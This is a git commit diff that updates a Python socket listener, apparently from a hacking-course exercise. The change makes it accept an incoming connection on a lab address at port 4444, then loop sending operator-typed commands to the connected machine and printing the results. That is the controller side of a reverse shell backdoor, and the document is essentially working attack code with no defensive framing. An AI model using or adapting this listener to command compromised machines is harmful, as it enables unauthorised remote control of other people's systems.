52ecf4bc3f0c33c0c95ec846dca4ef678aa682d9
Ryan Valdriz <ryvaldriz101@gmail.com>
2020-08-24 19:58:22 -0400

    updated listener

--- listener.py
+++ listener.py
@@ -4,9 +4,15 @@ import socket
 
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #allows socket to be reused in case connection drops
-
 listener.bind(("10.0.2.4", 4444))
+
 listener.listen(0) #backlog for how many connections to allow before stopping
 print("[+] Waiting for incoming connections. . .\n")
-listener.accept()
-print("[+] Connection established!\n")
+connection, address = listener.accept()
+print("[+] Connection established with " + str(address))
+
+while True:
+    command = raw_input(">> ")
+    connection.send(command)
+    result = connection.recv(2048).decode()
+    print(result)
